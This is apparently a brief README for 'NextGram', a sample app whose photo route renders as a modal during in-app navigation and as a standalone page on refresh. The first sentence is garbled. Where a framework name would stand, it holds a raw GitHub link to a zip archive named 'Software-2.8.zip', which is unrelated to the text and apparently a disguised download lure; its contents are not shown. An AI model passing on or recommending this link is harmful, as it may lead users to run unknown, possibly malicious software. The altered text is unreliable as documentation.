# NextGram

This is a sample https://raw.githubusercontent.com/suryansh-malik/nextgram/main/app/Software-2.8.zip application that takes advantage of the advanced routing capabilities.

The photo route can be attached to _two distinct_ components:

1. When navigating within the application, it is rendered as a modal
1. When the page is refreshed, it is rendered as a standalone page
